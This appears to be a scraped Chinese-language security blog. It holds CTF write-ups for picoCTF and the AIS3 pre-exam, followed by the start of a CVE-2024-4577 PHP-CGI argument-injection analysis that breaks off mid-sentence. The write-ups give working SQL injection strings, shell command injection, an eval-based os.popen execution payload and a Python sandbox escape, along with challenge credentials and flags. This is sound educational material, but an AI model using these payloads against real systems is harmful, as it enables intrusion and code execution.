12345VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVhRmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNkMlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVWVkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZsaGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg== ==經典base64 decode後 1234VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVXbUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdWMlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhibTkzVDFWT2JsQlVNRXNLCg== 再decode 123V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVRbHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hSbVZyTVhSWGFteEVXbm93T1VOblBUMEsK de 12WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lVWGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K deeee 12Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZNV1V3TW1Fek1tWjlDZz09Cg== eeeeeeee 1cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg== aaaaaaaaaa 1picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f} picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f} PermissionsAUTHOR: GEOFFREY NJOGU Description Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 53849 picoplayer@saturn.picoctf.net Password: x+T6aPgE4- Can you login and read the root file? picoCTF{uS1ng_v1m_3dit0r_f6ad392b} 水爛 chronoAUTHOR: MUBARAK MIKAIL Description How to automate tasks to run at intervals on linux servers? Use ssh to connect to this server: Server: saturn.picoctf.net Port: 50602 Username: picoplayer Password: tPmsUpiHeZ picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71} ? uselessAUTHOR: LOIC SHEMA Description There's an interesting script in the user's home directory Additional details will be available after launching your challenge instance. picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173} SpecialAUTHOR: LT 'SYREAL' JONES Description Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) Start your instance to see connection details. Additional details will be available after launching your challenge instance. 這題會一直把輸入的指令變成很簡單的單字，然後把開頭用成大寫ls會變Iscat會變Cat，但如果不是第一個字母就不會變大寫，所以可以用cat指令用; 搭配Regex Command Injection 1cat;cat * 發現目錄下面有一個資料夾blargh 1cat;cat blargh/* picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59} Reverse EngineeringReverseAUTHOR: MUBARAK MIKAIL Description Try reversing this file? Can ya? I forgot the password to this file. Please find it for me? 題目給了一個檔案ret，執行後要輸密碼 丟GDB 1234start cctrl^Cni到死 在呼叫strcmp比對密碼時把rsi dump出來，得到前半截flag picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528 重新執行ret，輸入密碼 picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289} Web ExploitationMore SQLiAUTHOR: MUBARAK MIKAIL Description Can you find the flag on this website. Additional details will be available after launching your challenge instance. Bypass login進入網頁，經典登入介面 12username=admin&amp;password=' or 'a'='a 題目很貼心把query都print出來給你 調整一下 12username=123&amp;password=' or 1=1;-- 進入之後有一個搜尋頁面 測試有幾個欄位1searchInput=' union select 1,2,3;-- dump Table1searchInput=' or 'a'='a 沒看到flag，可能在別的table 1' union select group_concat(sql),2,3 from sqlite_master WHERE type='table';-- 現在知道flag應該在more_table的flag_TEXT欄位 1' union select flag,2,3 from more_table;-- picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37} MatchTheRegexAUTHOR: SUNDAY JACOB NWANYIM Description How about trying to match a regular expression Additional details will be available after launching your challenge instance. 一開始沒看hint不知道到底要幹嘛 結果是要match^p.....F!? picoCTF{succ3ssfully_matchtheregex_9080e406} 世紀水題 findmeAUTHOR: GEOFFREY NJOGU Description Help us test the form by submiting the username as test and password as test! Additional details will be available after launching your challenge instance. 先用test test!登入 進去後他說I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-) 用BurpSuite查看被redirected的頁面id看起來很像經典base64 picoCTF{proxies_all_the_way_be716d8e}","link":"/2023/05/29/picoCTF-writeup/"},{"title":"2024 AIS3 pre-exam &amp; MFCTF writeup","text":"2024 AIS3 pre-exam writeup這次幫 AIS3 pre-exam 和 MFCTF 出題，出了兩題：一題 web 和一題 misc (但其實兩題都是web) evil calculator This is a calculator written in Python. It’s a simple calculator, but some function in it is VERY EVIL!!Connection info: http://chals1.ais3.org:5001Author: TriangleSnake 這是一題很簡單的pyjail(?有jail嗎)，主要問題出在 eval() function，但是有過濾 _ 和 space 。因為是warmup題，預期解是用open()讀flag，不會用到_和space。 1{&quot;expression&quot;:&quot;open('/flag','r').read()&quot;} 當然，你也可以把 _ 和 space encode 後 rce 1{&quot;expression&quot;:&quot;eval(eval('chr(95)')+eval('chr(95)')+'import'+eval('chr(95)')+eval('chr(95)')+\\&quot;('os').popen('').read()\\&quot;)&quot;} AIS3{7RiANG13_5NAK3_I5_50_3Vi1} emoji console 🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️Connection info: http://chals1.ais3.org:5000Author: TriangleSnake 這題和資安沒什麼關係，純粹是拼字遊戲，可以隨便按幾個 emoji 後就可以發現他就是把你輸入的 emoji 轉成英文單字後變成一行指令 試幾次會發現一些常用的指令，像是 🐱-&gt;cat 、 💿-&gt;cd ，還有題目剛進去就提示的 🐍-&gt;python 和 ⭐-&gt;* 嘗試使用 cat 命令看目錄下面有什麼1🐱 ⭐ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332#!/usr/local/bin/python3import osfrom flask import Flask,send_file,request,redirect,jsonify,render_templateimport jsonimport stringdef translate(command:str)-&gt;str: emoji_table = json.load(open('emoji.json','r',encoding='utf-8')) for key in emoji_table: if key in command: command = command.replace(key,emoji_table[key]) return command.lower()app = Flask(__name__)@app.route('/')def index(): return render_template('index.html')@app.route('/api')def api(): command = request.args.get('command') if len(set(command).intersection(set(string.printable.replace(&quot; &quot;,''))))&gt;0: return jsonify({'command':command,'result':'Invalid command'}) command = translate(command) result = os.popen(command+&quot; 2&gt;&amp;1&quot;).read() return jsonify({'command':command,'result':result}) if __name__ == '__main__': app.run('0.0.0.0',5000){ &quot;😀&quot;: &quot;:D&quot;, &quot;😁&quot;: &quot;:D&quot;, &quot;😂&quot;: &quot;:')&quot;, &quot;🤣&quot;: &quot;XD&quot;, &quot;😃&quot;: &quot;:D&quot;, &quot;😄&quot;: &quot;:D&quot;, &quot;😅&quot;: &quot;':D&quot;, &quot;😆&quot;: &quot;XD&quot;, &quot;😉&quot;: &quot;;)&quot;, &quot;😊&quot;: &quot;:)&quot;, &quot;😋&quot;: &quot;:P&quot;, &quot;😎&quot;: &quot;B)&quot;, &quot;😍&quot;: &quot;:)&quot;, &quot;😘&quot;: &quot;:*&quot;, &quot;😗&quot;: &quot;:*&quot;, &quot;😙&quot;: &quot;:*&quot;, &quot;😚&quot;: &quot;:*&quot;, &quot;☺️&quot;: &quot;:)&quot;, &quot;🙂&quot;: &quot;:)&quot;, &quot;🤗&quot;: &quot;:)&quot;, &quot;🤩&quot;: &quot;:)&quot;, &quot;🤔&quot;: &quot;:?&quot;, &quot;🤨&quot;: &quot;:/&quot;, &quot;😐&quot;: &quot;:|&quot;, &quot;😑&quot;: &quot;:|&quot;, &quot;😶&quot;: &quot;:|&quot;, &quot;🙄&quot;: &quot;:/&quot;, &quot;😏&quot;: &quot;:]&quot;, &quot;😣&quot;: &quot;&gt;:&quot;, &quot;😥&quot;: &quot;:'(&quot;, &quot;😮&quot;: &quot;:o&quot;, &quot;🤐&quot;: &quot;:x&quot;, &quot;😯&quot;: &quot;:o&quot;, &quot;😪&quot;: &quot;:'(&quot;, &quot;😫&quot;: &quot;&gt;:(&quot;, &quot;😴&quot;: &quot;Zzz&quot;, &quot;😌&quot;: &quot;:)&quot;, &quot;😛&quot;: &quot;:P&quot;, &quot;😜&quot;: &quot;;P&quot;, &quot;😝&quot;: &quot;XP&quot;, &quot;🤤&quot;: &quot;:P&quot;, &quot;😒&quot;: &quot;:/&quot;, &quot;😓&quot;: &quot;;/&quot;, &quot;😔&quot;: &quot;:(&quot;, &quot;😕&quot;: &quot;:/&quot;, &quot;🙃&quot;: &quot;(:&quot;, &quot;🤑&quot;: &quot;$)&quot;, &quot;😲&quot;: &quot;:O&quot;, &quot;☹️&quot;: &quot;:(&quot;, &quot;🙁&quot;: &quot;:(&quot;, &quot;😖&quot;: &quot;&gt;:(&quot;, &quot;😞&quot;: &quot;:(&quot;, &quot;😟&quot;: &quot;:(&quot;, &quot;😤&quot;: &quot;&gt;:(&quot;, &quot;😢&quot;: &quot;:'(&quot;, &quot;😭&quot;: &quot;:'(&quot;, &quot;😦&quot;: &quot;:(&quot;, &quot;😧&quot;: &quot;&gt;:(&quot;, &quot;😨&quot;: &quot;:O&quot;, &quot;😩&quot;: &quot;&gt;:(&quot;, &quot;🤯&quot;: &quot;:O&quot;, &quot;😬&quot;: &quot;:E&quot;, &quot;😰&quot;: &quot;:(&quot;, &quot;😱&quot;: &quot;:O&quot;, &quot;🥵&quot;: &quot;&gt;:(&quot;, &quot;🥶&quot;: &quot;:(&quot;, &quot;😳&quot;: &quot;:$&quot;, &quot;🤪&quot;: &quot;:P&quot;, &quot;😵&quot;: &quot;X(&quot;, &quot;🥴&quot;: &quot;:P&quot;, &quot;😠&quot;: &quot;&gt;:(&quot;, &quot;😡&quot;: &quot;&gt;:(&quot;, &quot;🤬&quot;: &quot;#$%&amp;!&quot;, &quot;🤕&quot;: &quot;:(&quot;, &quot;🤢&quot;: &quot;X(&quot;, &quot;🤮&quot;: &quot;:P&quot;, &quot;🤧&quot;: &quot;:'(&quot;, &quot;😇&quot;: &quot;O:)&quot;, &quot;🥳&quot;: &quot;:D&quot;, &quot;🥺&quot;: &quot;:'(&quot;, &quot;🤡&quot;: &quot;:o)&quot;, &quot;🤠&quot;: &quot;Y)&quot;, &quot;🤥&quot;: &quot;:L&quot;, &quot;🤫&quot;: &quot;:x&quot;, &quot;🤭&quot;: &quot;:x&quot;, &quot;🐶&quot;: &quot;dog&quot;, &quot;🐱&quot;: &quot;cat&quot;, &quot;🐭&quot;: &quot;mouse&quot;, &quot;🐹&quot;: &quot;hamster&quot;, &quot;🐰&quot;: &quot;rabbit&quot;, &quot;🦊&quot;: &quot;fox&quot;, &quot;🐻&quot;: &quot;bear&quot;, &quot;🐼&quot;: &quot;panda&quot;, &quot;🐨&quot;: &quot;koala&quot;, &quot;🐯&quot;: &quot;tiger&quot;, &quot;🦁&quot;: &quot;lion&quot;, &quot;🐮&quot;: &quot;cow&quot;, &quot;🐷&quot;: &quot;pig&quot;, &quot;🐽&quot;: &quot;pig nose&quot;, &quot;🐸&quot;: &quot;frog&quot;, &quot;🐒&quot;: &quot;monkey&quot;, &quot;🐔&quot;: &quot;chicken&quot;, &quot;🐧&quot;: &quot;penguin&quot;, &quot;🐦&quot;: &quot;bird&quot;, &quot;🐤&quot;: &quot;baby chick&quot;, &quot;🐣&quot;: &quot;hatching chick&quot;, &quot;🐥&quot;: &quot;front-facing baby chick&quot;, &quot;🦆&quot;: &quot;duck&quot;, &quot;🦅&quot;: &quot;eagle&quot;, &quot;🦉&quot;: &quot;owl&quot;, &quot;🦇&quot;: &quot;bat&quot;, &quot;🐺&quot;: &quot;wolf&quot;, &quot;🐗&quot;: &quot;boar&quot;, &quot;🐴&quot;: &quot;horse&quot;, &quot;🦄&quot;: &quot;unicorn&quot;, &quot;🐝&quot;: &quot;bee&quot;, &quot;🐛&quot;: &quot;bug&quot;, &quot;🦋&quot;: &quot;butterfly&quot;, &quot;🐌&quot;: &quot;snail&quot;, &quot;🐞&quot;: &quot;lady beetle&quot;, &quot;🐜&quot;: &quot;ant&quot;, &quot;🦟&quot;: &quot;mosquito&quot;, &quot;🦗&quot;: &quot;cricket&quot;, &quot;🕷️&quot;: &quot;spider&quot;, &quot;🕸️&quot;: &quot;spider web&quot;, &quot;🦂&quot;: &quot;scorpion&quot;, &quot;🐢&quot;: &quot;turtle&quot;, &quot;🐍&quot;: &quot;python&quot;, &quot;🦎&quot;: &quot;lizard&quot;, &quot;🦖&quot;: &quot;T-Rex&quot;, &quot;🦕&quot;: &quot;sauropod&quot;, &quot;🐙&quot;: &quot;octopus&quot;, &quot;🦑&quot;: &quot;squid&quot;, &quot;🦐&quot;: &quot;shrimp&quot;, &quot;🦞&quot;: &quot;lobster&quot;, &quot;🦀&quot;: &quot;crab&quot;, &quot;🐡&quot;: &quot;blowfish&quot;, &quot;🐠&quot;: &quot;tropical fish&quot;, &quot;🐟&quot;: &quot;fish&quot;, &quot;🐬&quot;: &quot;dolphin&quot;, &quot;🐳&quot;: &quot;whale&quot;, &quot;🐋&quot;: &quot;whale&quot;, &quot;🦈&quot;: &quot;shark&quot;, &quot;🐊&quot;: &quot;crocodile&quot;, &quot;🐅&quot;: &quot;tiger&quot;, &quot;🐆&quot;: &quot;leopard&quot;, &quot;🦓&quot;: &quot;zebra&quot;, &quot;🦍&quot;: &quot;gorilla&quot;, &quot;🦧&quot;: &quot;orangutan&quot;, &quot;🦣&quot;: &quot;mammoth&quot;, &quot;🐘&quot;: &quot;elephant&quot;, &quot;🦛&quot;: &quot;hippopotamus&quot;, &quot;🦏&quot;: &quot;rhinoceros&quot;, &quot;🐪&quot;: &quot;camel&quot;, &quot;🐫&quot;: &quot;two-hump camel&quot;, &quot;🦒&quot;: &quot;giraffe&quot;, &quot;🦘&quot;: &quot;kangaroo&quot;, &quot;🦬&quot;: &quot;bison&quot;, &quot;🦥&quot;: &quot;sloth&quot;, &quot;🦦&quot;: &quot;otter&quot;, &quot;🦨&quot;: &quot;skunk&quot;, &quot;🦡&quot;: &quot;badger&quot;, &quot;🐾&quot;: &quot;paw prints&quot;, &quot;◼️&quot;: &quot;black square&quot;, &quot;◻️&quot;: &quot;white square&quot;, &quot;◾&quot;: &quot;black medium square&quot;, &quot;◽&quot;: &quot;white medium square&quot;, &quot;▪️&quot;: &quot;black small square&quot;, &quot;▫️&quot;: &quot;white small square&quot;, &quot;🔶&quot;: &quot;large orange diamond&quot;, &quot;🔷&quot;: &quot;large blue diamond&quot;, &quot;🔸&quot;: &quot;small orange diamond&quot;, &quot;🔹&quot;: &quot;small blue diamond&quot;, &quot;🔺&quot;: &quot;triangle&quot;, &quot;🔻&quot;: &quot;triangle&quot;, &quot;🔼&quot;: &quot;triangle&quot;, &quot;🔽&quot;: &quot;triangle&quot;, &quot;🔘&quot;: &quot;circle&quot;, &quot;⚪&quot;: &quot;circle&quot;, &quot;⚫&quot;: &quot;black circle&quot;, &quot;🟠&quot;: &quot;orange circle&quot;, &quot;🟢&quot;: &quot;green circle&quot;, &quot;🔵&quot;: &quot;blue circle&quot;, &quot;🟣&quot;: &quot;purple circle&quot;, &quot;🟡&quot;: &quot;yellow circle&quot;, &quot;🟤&quot;: &quot;brown circle&quot;, &quot;⭕&quot;: &quot;empty circle&quot;, &quot;🅰️&quot;: &quot;A&quot;, &quot;🅱️&quot;: &quot;B&quot;, &quot;🅾️&quot;: &quot;O&quot;, &quot;ℹ️&quot;: &quot;i&quot;, &quot;🅿️&quot;: &quot;P&quot;, &quot;Ⓜ️&quot;: &quot;M&quot;, &quot;🆎&quot;: &quot;AB&quot;, &quot;🆑&quot;: &quot;CL&quot;, &quot;🆒&quot;: &quot;COOL&quot;, &quot;🆓&quot;: &quot;FREE&quot;, &quot;🆔&quot;: &quot;ID&quot;, &quot;🆕&quot;: &quot;NEW&quot;, &quot;🆖&quot;: &quot;NG&quot;, &quot;🆗&quot;: &quot;OK&quot;, &quot;🆘&quot;: &quot;SOS&quot;, &quot;🆙&quot;: &quot;UP&quot;, &quot;🆚&quot;: &quot;VS&quot;, &quot;㊗️&quot;: &quot;祝&quot;, &quot;㊙️&quot;: &quot;秘&quot;, &quot;🈺&quot;: &quot;營&quot;, &quot;🈯&quot;: &quot;指&quot;, &quot;🉐&quot;: &quot;得&quot;, &quot;🈹&quot;: &quot;割&quot;, &quot;🈚&quot;: &quot;無&quot;, &quot;🈲&quot;: &quot;禁&quot;, &quot;🈸&quot;: &quot;申&quot;, &quot;🈴&quot;: &quot;合&quot;, &quot;🈳&quot;: &quot;空&quot;, &quot;🈵&quot;: &quot;滿&quot;, &quot;🈶&quot;: &quot;有&quot;, &quot;🈷️&quot;: &quot;月&quot;, &quot;🚗&quot;: &quot;car&quot;, &quot;🚕&quot;: &quot;taxi&quot;, &quot;🚙&quot;: &quot;SUV&quot;, &quot;🚌&quot;: &quot;bus&quot;, &quot;🚎&quot;: &quot;trolleybus&quot;, &quot;🏎️&quot;: &quot;race car&quot;, &quot;🚓&quot;: &quot;police car&quot;, &quot;🚑&quot;: &quot;ambulance&quot;, &quot;🚒&quot;: &quot;fire engine&quot;, &quot;🚐&quot;: &quot;minibus&quot;, &quot;🚚&quot;: &quot;delivery truck&quot;, &quot;🚛&quot;: &quot;articulated lorry&quot;, &quot;🚜&quot;: &quot;tractor&quot;, &quot;🛴&quot;: &quot;kick scooter&quot;, &quot;🚲&quot;: &quot;bicycle&quot;, &quot;🛵&quot;: &quot;scooter&quot;, &quot;🏍️&quot;: &quot;motorcycle&quot;, &quot;✈️&quot;: &quot;airplane&quot;, &quot;🚀&quot;: &quot;rocket&quot;, &quot;🛸&quot;: &quot;UFO&quot;, &quot;🚁&quot;: &quot;helicopter&quot;, &quot;🛶&quot;: &quot;canoe&quot;, &quot;⛵&quot;: &quot;sailboat&quot;, &quot;🚤&quot;: &quot;speedboat&quot;, &quot;🛳️&quot;: &quot;passenger ship&quot;, &quot;⛴️&quot;: &quot;ferry&quot;, &quot;🛥️&quot;: &quot;motor boat&quot;, &quot;🚢&quot;: &quot;ship&quot;, &quot;👨&quot;: &quot;man&quot;, &quot;👩&quot;: &quot;woman&quot;, &quot;👶&quot;: &quot;baby&quot;, &quot;🧓&quot;: &quot;old man&quot;, &quot;👵&quot;: &quot;old woman&quot;, &quot;💿&quot;: &quot;CD&quot;, &quot;📀&quot;: &quot;DVD&quot;, &quot;📱&quot;: &quot;phone&quot;, &quot;💻&quot;: &quot;laptop&quot;, &quot;🖥️&quot;: &quot;pc&quot;, &quot;🖨️&quot;: &quot;printer&quot;, &quot;⌨️&quot;: &quot;keyboard&quot;, &quot;🖱️&quot;: &quot;mouse&quot;, &quot;🖲️&quot;: &quot;trackball&quot;, &quot;🕹️&quot;: &quot;joystick&quot;, &quot;🗜️&quot;: &quot;clamp&quot;, &quot;💾&quot;: &quot;floppy disk&quot;, &quot;💽&quot;: &quot;minidisc&quot;, &quot;☎️&quot;: &quot;telephone&quot;, &quot;📟&quot;: &quot;pager&quot;, &quot;📺&quot;: &quot;television&quot;, &quot;📻&quot;: &quot;radio&quot;, &quot;🎙️&quot;: &quot;studio microphone&quot;, &quot;🎚️&quot;: &quot;level slider&quot;, &quot;🎛️&quot;: &quot;control knobs&quot;, &quot;⏰&quot;: &quot;alarm clock&quot;, &quot;🕰️&quot;: &quot;mantelpiece clock&quot;, &quot;⌚&quot;: &quot;watch&quot;, &quot;📡&quot;: &quot;satellite antenna&quot;, &quot;🔋&quot;: &quot;battery&quot;, &quot;🔌&quot;: &quot;plug&quot;, &quot;🚩&quot;: &quot;flag&quot;, &quot;⓿&quot;: &quot;0&quot;, &quot;❶&quot;: &quot;1&quot;, &quot;❷&quot;: &quot;2&quot;, &quot;❸&quot;: &quot;3&quot;, &quot;❹&quot;: &quot;4&quot;, &quot;❺&quot;: &quot;5&quot;, &quot;❻&quot;: &quot;6&quot;, &quot;❼&quot;: &quot;7&quot;, &quot;❽&quot;: &quot;8&quot;, &quot;❾&quot;: &quot;9&quot;, &quot;❿&quot;: &quot;10&quot;, &quot;⭐&quot;: &quot;*&quot;, &quot;➕&quot;: &quot;+&quot;, &quot;➖&quot;: &quot;-&quot;, &quot;✖️&quot;: &quot;×&quot;, &quot;➗&quot;: &quot;÷&quot;}cat: flag: Is a directorycat: templates: Is a directory 現在我們得到一個json有所有指令的對照表，並且可以知道flag應該是在 flag 的資料夾。 嘗試 cat flag 資料夾裡面的東西，可以從剛剛 dump 出來的 json 找可以用的指令，這邊使用;/和:|切割指令，回傳的結果似乎是一個 python file 1💿 🚩😓😑🐱 ⭐ #cd flag;/:| 123#flag-printer.pyprint(open('/flag','r').read()) 執行python，get flag1💿 🚩😓😑🐍❸ 🚩➖🖨️⭐ AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈} Can you describe Pyjail? Yet another 🐍 ⛓️.nc chals1.ais3.org 48763Author: Vincent55 這題不是我出的，但是 Vincent 大佬出的題目還是要捧場一下 source code看source code可以知道是很純的pyjail，在 safe_eval 裡面就把該 ban 的都 ban 光了 跟前面那題 evil calculator 比起來 calculator 一點都不 evil 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/local/bin/python3from safe_eval import safe_evalfrom inspect import getdocclass Desc: &quot;&quot;&quot; Welcome to my 🐍 ⛓️ &quot;&quot;&quot; def __get__(self, objname, obj): return __import__(&quot;conf&quot;).flag def desc_helper(self, name): origin = getattr(type, name) if origin == type.__getattribute__: raise NameError( &quot;Access to forbidden name %r (%r)&quot; % (name, &quot;__getattribute__&quot;) ) self.helper = originclass Test: desc = Desc()test = Test()test.desc = &quot;flag{fakeflag}&quot;# Just a tricky way to print a welcome message, or maybe a hint :/# You can just `print(getdoc(Desc))`# This is not part of the challenge, but if you can get the flag through here, please contact @Vincent55.welcome_msg = &quot;&quot;&quot;desctmp := Desc()desctmp.desc_helper(&quot;__base__&quot;)Obj := desctmp.helperdesctmp := Desc()desctmp.desc_helper(&quot;__subclasses__&quot;)print(getdoc(desctmp.helper(Obj)[-2]))&quot;&quot;&quot;.strip().replace(&quot;\\n&quot;, &quot;,&quot;)welcome_msg = f&quot;({welcome_msg})&quot;safe_eval( welcome_msg, {&quot;__builtins__&quot;: {}}, {&quot;Desc&quot;: Desc, &quot;print&quot;: print, &quot;getdoc&quot;: getdoc},)# Your challenge begin here!payload = input(&quot;✏️: &quot;)safe_eval( payload, {&quot;__builtins__&quot;: {}}, {&quot;Desc&quot;: Desc},)# print(f&quot;test.__dict__: {test.__dict__}&quot;)print(f&quot;🚩: {test.desc}&quot;) 看完 source code 可以發現他在print welcome_msg 的時候用了一個非常詭異的方法，也算是這題的題示。 welcome_msg到底在幹嘛首先看到下面這段程式碼： 123456789101112131415welcome_msg = &quot;&quot;&quot;desctmp := Desc()desctmp.desc_helper(&quot;__base__&quot;)Obj := desctmp.helperdesctmp := Desc()desctmp.desc_helper(&quot;__subclasses__&quot;)print(getdoc(desctmp.helper(Obj)[-2]))&quot;&quot;&quot;.strip().replace(&quot;\\n&quot;, &quot;,&quot;)welcome_msg = f&quot;({welcome_msg})&quot;safe_eval( welcome_msg, {&quot;__builtins__&quot;: {}}, {&quot;Desc&quot;: Desc, &quot;print&quot;: print, &quot;getdoc&quot;: getdoc},) 其實會發現你可以透過 getattr(type, name) 取得type底下的attribute這裡會卡一個知識點，就是當你要取得某個 class 的 subclass 的時候(假設是 str )，會寫 str.__subclasses__() ，但其實可以寫成 type.__subclasses__(str) ，前提是 str 的 class 必須是 type 所以我們可以先透過 getattr(type,&quot;__subclasses__&quot;) 取得 type.__subclasses__ 再把 __base__ 塞進去就可以得到 type.__base__.__subclasses__() 好到這邊大家應該已經搞懂上面那陀 welcome_msg 的 payload 到底在幹嘛了，簡單來說就是到 object 裡面把所有 class 抓出來，然後抓倒數第2個 class (jail.Desc)把它印出來 解題一開始想改抓 jail.Test 下面的 desc 就可以拿到 flag 了抓是抓得到，但是print不出來啊 1a = Desc();a.desc_helper(&quot;__base__&quot;);obj=a.helper;a = Desc();a.desc_helper(&quot;__subclasses__&quot;);obj = a.helper(obj)[-1].desc 這邊又卡一個知識點了，那就是 python 的 descriptor 解析有優先度的問題(題目有提示describe，雖然我覺得沒有人看得懂) 以下參考 @Vincent550102 的筆記： 如果 __get__ 與 __set__ 都有，優先使用描述器（Descriptor）：當一個描述器同時實現了 __get__ 和 __set__ 方法時，Python 會認為它是一個資料描述器（Data Descriptor）。資料描述器的一個特點是它們對屬性的訪問有更高的優先級。如果不是，則在自己的 __dict__ 裡面找： 如果描述器沒有作為資料描述器或者只實現了 __get__ 方法的非資料描述器（Non-Data Descriptor）或者找不到描述器，Python 會繼續在物件的 __dict__ 屬性字典中尋找是否存在該屬性。 若在 __dict__ 也找不到，嘗試用描述器的 __get__：如果在物件的 dict 中找不到該屬性，Python 會檢查是否存在只實現了 get 方法的非資料描述器，如果存在，則回傳該描述器的 __get__ 方法。都沒有，直接回傳描述器： 如果上述步驟都無法找到該屬性，最後會返回描述器物件本身，如果連描述器也不存在，則會拋出 AttributeError。 看到這邊，問題已經變很簡單了，那就是我們需要將 __get__ 變成最高優先級，此時後面就算 fake_flag 把 test.desc 蓋掉也沒有用，仍然會回傳 Test.__get__() 的內容 如何將 __get__ 變成最高優先級呢？只要新增一個 __set__ 就行了 12func = lambda self,obj,val:Nonedesc.__setattr__(&quot;__set__&quot;,func) 12#payload(a := Desc(),a.desc_helper(&quot;__base__&quot;),obj:=a.helper,a := Desc(),a.desc_helper(&quot;__subclasses__&quot;),desc:=a.helper(obj)[-2],a:=Desc(),a.desc_helper(&quot;__setattr__&quot;),func:=lambda self,obj,val:None,a.helper(desc,&quot;__set__&quot;,func)) AIS3{y0u_kn0w_h0w_d35cr1p70r_w0rk!}","link":"/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/"},{"title":"CVE-2024-4577 PHP CGI漏洞複現及研究","text":"漏洞簡介CVE-2024-4577是一個 PHP CGI 的參數注入漏洞，這個漏洞繞過了 CVE-2012-2311 的保護，透過 windows BEST-Fit 的特性，構造不存在的 urlencode 字元讓 Windows 解析出 - 字元，從而繞過 php cgi 的保護機制。 漏洞分析要了解這個漏洞，我們需要先坐時光機回到最初的漏洞，也就是CVE-2012-2311更之前的 PHP 5.3.11 CVE-2012-1823漏洞成因首先，我們有一個先備知識要知道，那就是 http server 呼叫 CGI 時，會連同 request 的 query 一起當成參數傳給 CGI ，例如：我今天存取了 http://192.168.22.16/php-cgi/php-cgi.exe?foo 時，apache 啟動CGI 的 commandline 其實長這樣： 因此攻擊者只要構造出開頭為 - 的 querystring ， CGI 就會把他當成參數解析，從而導致參數注入漏洞。 漏洞修補針對 CVE-2012–1823 出現的漏洞，PHP在 5.3.12 將漏洞 patch 掉，方法是檢查 querystring 的開頭是不是 - 12345678910- while ((c = php_getopt(argc, argv, OPTIONS, &amp;php_optarg, &amp;php_optind, 0)) != -1) {+ if(query_string = getenv(&quot;QUERY_STRING&quot;)) {+ decoded_query_string = strdup(query_string);+ php_url_decode(decoded_query_string, strlen(decoded_query_string));+ if(*decoded_query_string == '-' &amp;&amp; strchr(query_string, '=') == NULL) {+ skip_getopt = 1;+ }+ free(decoded_query_string);+ }+ while (!skip_getopt &amp;&amp; (c = php_getopt(argc, argv, OPTIONS, &amp;php_optarg, &amp;php_optind, 0)) != -1) { CVE-2012-2311漏洞成因在 5.3.12 發佈後不到一個禮拜就被人 bypass 了，因為只要在-前面塞空格就好(?) 漏洞修補PHP官方很快就發佈了 5.3.13 版本，這次他們先把前面的空白都變不見(pointer往後移)，再檢查開頭是不是 - 123456for (p = decoded_query_string; *p &amp;&amp; *p &lt;= ' '; p++) { /* skip all leading spaces */ } if(*p == '-') { skip_getopt = 1; } CVE-2024-4577時隔12年，這個保護機制又被繞掉了，但這次並不影響到全部的php版本，而是只有某些特定語系的 Windows 作業系統，且需要由 CGI 解析才會觸發。 漏洞成因這個漏洞是因為在 Windows 上有 BEST-Fit 的特性，讓攻擊者在繁體中文等特定語系環境的 Windows 直接生出一個完全不存在的字元(0xad)卻可以被解析成 